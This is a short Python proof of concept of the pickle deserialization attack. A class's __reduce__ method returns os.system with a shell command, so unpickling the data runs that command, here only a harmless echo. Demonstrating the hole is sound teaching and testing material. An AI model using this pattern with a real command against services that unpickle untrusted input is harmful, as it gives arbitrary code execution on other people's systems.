import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "Hacked!"',))

pickled_data = pickle.dumps(EvilPickle())

# This will execute 'echo "Hacked!"'
pickle.loads(pickled_data)
